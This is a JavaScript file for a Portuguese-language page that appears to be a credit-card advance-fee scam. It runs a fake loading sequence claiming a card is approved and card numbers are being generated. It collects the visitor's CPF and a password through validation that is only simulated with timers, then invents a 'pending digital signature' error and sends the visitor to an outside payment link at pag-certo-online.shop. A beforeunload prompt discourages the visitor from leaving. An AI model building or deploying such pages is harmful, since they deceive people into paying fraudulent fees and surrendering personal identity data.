// Loading sequence controller
document.addEventListener('DOMContentLoaded', function() {
    startLoadingSequence();
    setupCPFMask();
});

function startLoadingSequence() {
    // Show success for first steps
    setTimeout(() => {
        updateLoadingText('Cartão Totalmente Liberado!', 'Todos os processos concluídos com sucesso.');
        showSuccessMessage();
    }, 3000);
    
    // Start generating card numbers
    setTimeout(() => {
        updateLoadingText('Gerando Números do Cartão', 'Criando dados seguros do cartão...');
        activateStep3();
    }, 5000);
    
    // Complete card generation
    setTimeout(() => {
        completeStep3();
        updateLoadingText('Verificação Final', 'Validando assinatura digital...');
    }, 8000);
    
    // Show signature error
    setTimeout(() => {
        showSignatureError();
    }, 10000);
    
    // Show login screen
    setTimeout(() => {
        showLoginScreen();
    }, 12000);
}

function updateLoadingText(title, subtitle) {
    document.getElementById('loadingTitle').textContent = title;
    document.getElementById('loadingSubtitle').textContent = subtitle;
}

function showSuccessMessage() {
    const successMessage = document.getElementById('successMessage');
    successMessage.style.display = 'flex';
    playSuccessSound();
}

function activateStep3() {
    const step3 = document.getElementById('step3');
    const status3 = document.getElementById('status3');
    const loader3 = document.getElementById('loader3');
    
    step3.classList.add('active');
    status3.textContent = 'Gerando números...';
    loader3.style.display = 'block';
}

function completeStep3() {
    const step3 = document.getElementById('step3');
    const status3 = document.getElementById('status3');
    const loader3 = document.getElementById('loader3');
    
    step3.classList.remove('active');
    step3.classList.add('completed');
    status3.textContent = 'Gerado ✓';
    loader3.style.display = 'none';
    playSuccessSound();
}

function showSignatureError() {
    const successMessage = document.getElementById('successMessage');
    const errorMessage = document.getElementById('errorMessage');
    
    successMessage.style.display = 'none';
    errorMessage.style.display = 'flex';
    
    updateLoadingText('Assinatura Digital Pendente', 'É necessário completar a assinatura digital.');
    playErrorSound();
}

function showLoginScreen() {
    const loadingScreen = document.getElementById('loadingScreen');
    const loginScreen = document.getElementById('loginScreen');
    
    // Fade out loading screen
    loadingScreen.style.transition = 'opacity 0.5s ease';
    loadingScreen.style.opacity = '0';
    
    setTimeout(() => {
        loadingScreen.style.display = 'none';
        loginScreen.style.display = 'block';
        
        // Fade in login screen
        loginScreen.style.opacity = '0';
        loginScreen.style.transition = 'opacity 0.5s ease';
        
        setTimeout(() => {
            loginScreen.style.opacity = '1';
        }, 50);
        
        // Add entrance animation to content
        const content = document.querySelector('.login-content');
        content.style.transform = 'translateY(30px)';
        content.style.opacity = '0';
        content.style.transition = 'all 0.6s ease';
        
        setTimeout(() => {
            content.style.transform = 'translateY(0)';
            content.style.opacity = '1';
        }, 200);
        
    }, 500);
}

function setupCPFMask() {
    const cpfInput = document.getElementById('cpf');
    if (cpfInput) {
        cpfInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
            e.target.value = value;
        });
    }
}

function validateCPF() {
    const cpfInput = document.getElementById('cpf');
    const cpf = cpfInput.value.replace(/\D/g, '');
    
    if (cpf.length !== 11) {
        showNotification('Por favor, digite um CPF válido', 'error');
        cpfInput.focus();
        return;
    }
    
    // Show loading state
    const btn = event.target;
    const originalText = btn.innerHTML;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> VALIDANDO...';
    btn.disabled = true;
    
    // Show processing notification
    showNotification('Validando CPF...', 'info');
    
    // Simulate validation
    setTimeout(() => {
        showNotification('CPF validado com sucesso!', 'success');
        showPasswordForm();
        btn.innerHTML = originalText;
        btn.disabled = false;
    }, 2000);
}

function showPasswordForm() {
    const loginForm = document.getElementById('loginForm');
    const passwordForm = document.getElementById('passwordForm');
    
    loginForm.style.transition = 'opacity 0.3s ease';
    loginForm.style.opacity = '0';
    
    setTimeout(() => {
        loginForm.style.display = 'none';
        passwordForm.style.display = 'block';
        passwordForm.style.opacity = '0';
        passwordForm.style.transition = 'opacity 0.3s ease';
        
        setTimeout(() => {
            passwordForm.style.opacity = '1';
        }, 50);
    }, 300);
}

function validatePassword() {
    const password = document.getElementById('password').value;
    const confirmPassword = document.getElementById('confirmPassword').value;
    
    if (password.length < 6) {
        showNotification('A senha deve ter pelo menos 6 caracteres', 'error');
        document.getElementById('password').focus();
        return;
    }
    
    if (password !== confirmPassword) {
        showNotification('As senhas não coincidem', 'error');
        document.getElementById('confirmPassword').focus();
        return;
    }
    
    // Show loading state
    const btn = event.target;
    const originalText = btn.innerHTML;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> CRIANDO...';
    btn.disabled = true;
    
    // Show processing notification
    showNotification('Criando senha...', 'info');
    
    // Simulate password creation
    setTimeout(() => {
        showNotification('Senha criada com sucesso!', 'success');
        
        setTimeout(() => {
            showSignatureScreen();
        }, 1500);
        
        btn.innerHTML = originalText;
        btn.disabled = false;
    }, 2000);
}

function showSignatureScreen() {
    const loginScreen = document.getElementById('loginScreen');
    const signatureScreen = document.getElementById('signatureScreen');
    
    // Fade out login screen
    loginScreen.style.transition = 'opacity 0.5s ease';
    loginScreen.style.opacity = '0';
    
    setTimeout(() => {
        loginScreen.style.display = 'none';
        signatureScreen.style.display = 'block';
        
        // Fade in signature screen
        signatureScreen.style.opacity = '0';
        signatureScreen.style.transition = 'opacity 0.5s ease';
        
        setTimeout(() => {
            signatureScreen.style.opacity = '1';
        }, 50);
        
        // Add entrance animation to content
        const content = document.querySelector('.signature-content');
        content.style.transform = 'translateY(30px)';
        content.style.opacity = '0';
        content.style.transition = 'all 0.6s ease';
        
        setTimeout(() => {
            content.style.transform = 'translateY(0)';
            content.style.opacity = '1';
        }, 200);
        
    }, 500);
}

function redirectToSignaturePayment() {
    const btn = event.target;
    const originalText = btn.innerHTML;
    
    // Show loading state
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSANDO...';
    btn.disabled = true;
    btn.style.opacity = '0.8';
    
    // Show processing notification
    showNotification('Redirecionando para pagamento da assinatura...', 'info');
    
    // Redirect after delay
    setTimeout(() => {
        window.location.href = 'https://pay.pag-certo-online.shop/DYp0ZxVQ6KXgmvX';
    }, 2000);
}

function playSuccessSound() {
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();
        
        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);
        
        oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
        oscillator.frequency.setValueAtTime(1000, audioContext.currentTime + 0.1);
        
        gainNode.gain.setValueAtTime(0, audioContext.currentTime);
        gainNode.gain.linearRampToValueAtTime(0.1, audioContext.currentTime + 0.01);
        gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.2);
        
        oscillator.start(audioContext.currentTime);
        oscillator.stop(audioContext.currentTime + 0.2);
    } catch (e) {
        console.log('Audio not supported');
    }
}

function playErrorSound() {
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();
        
        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);
        
        oscillator.frequency.setValueAtTime(400, audioContext.currentTime);
        oscillator.frequency.setValueAtTime(300, audioContext.currentTime + 0.2);
        
        gainNode.gain.setValueAtTime(0, audioContext.currentTime);
        gainNode.gain.linearRampToValueAtTime(0.15, audioContext.currentTime + 0.01);
        gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.4);
        
        oscillator.start(audioContext.currentTime);
        oscillator.stop(audioContext.currentTime + 0.4);
    } catch (e) {
        console.log('Audio not supported');
    }
}

function showNotification(message, type = 'info') {
    // Create notification element
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    
    let bgColor = '#2196f3';
    let icon = 'fa-info-circle';
    
    if (type === 'error') {
        bgColor = '#f44336';
        icon = 'fa-exclamation-triangle';
    } else if (type === 'success') {
        bgColor = '#4caf50';
        icon = 'fa-check-circle';
    }
    
    notification.innerHTML = `
        <div class="notification-content">
            <i class="fas ${icon}"></i>
            <span>${message}</span>
        </div>
    `;
    
    // Add notification styles
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: linear-gradient(135deg, ${bgColor} 0%, ${bgColor}dd 100%);
        color: white;
        padding: 15px 20px;
        border-radius: 10px;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
        z-index: 10001;
        animation: slideInRight 0.3s ease;
        max-width: 300px;
        font-size: 14px;
        font-weight: 500;
    `;
    
    // Add to page
    document.body.appendChild(notification);
    
    // Remove after delay
    setTimeout(() => {
        notification.style.animation = 'slideOutRight 0.3s ease';
        setTimeout(() => {
            if (notification.parentNode) {
                notification.parentNode.removeChild(notification);
            }
        }, 300);
    }, 4000);
}

// Add CSS animations for notifications
const style = document.createElement('style');
style.textContent = `
    @keyframes slideInRight {
        from {
            transform: translateX(100%);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
    
    @keyframes slideOutRight {
        from {
            transform: translateX(0);
            opacity: 1;
        }
        to {
            transform: translateX(100%);
            opacity: 0;
        }
    }
    
    .notification-content {
        display: flex;
        align-items: center;
        gap: 10px;
    }
`;
document.head.appendChild(style);

// Add touch feedback for mobile
document.addEventListener('touchstart', function(e) {
    if (e.target.classList.contains('login-btn') || e.target.classList.contains('signature-btn')) {
        e.target.style.transform = 'scale(0.98)';
    }
});

document.addEventListener('touchend', function(e) {
    if (e.target.classList.contains('login-btn') || e.target.classList.contains('signature-btn')) {
        setTimeout(() => {
            e.target.style.transform = '';
        }, 100);
    }
});

// Handle Enter key in forms
document.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        const activeElement = document.activeElement;
        
        if (activeElement.id === 'cpf') {
            validateCPF();
        } else if (activeElement.id === 'password' || activeElement.id === 'confirmPassword') {
            validatePassword();
        }
    }
});

// Prevent accidental navigation
window.addEventListener('beforeunload', function(e) {
    const loadingScreen = document.getElementById('loadingScreen');
    const loginScreen = document.getElementById('loginScreen');
    const signatureScreen = document.getElementById('signatureScreen');
    
    if (loadingScreen.style.display !== 'none' || 
        loginScreen.style.display !== 'none' || 
        signatureScreen.style.display !== 'none') {
        e.preventDefault();
        e.returnValue = '';
        return 'Tem certeza que deseja sair? O processo de assinatura está em andamento.';
    }
});

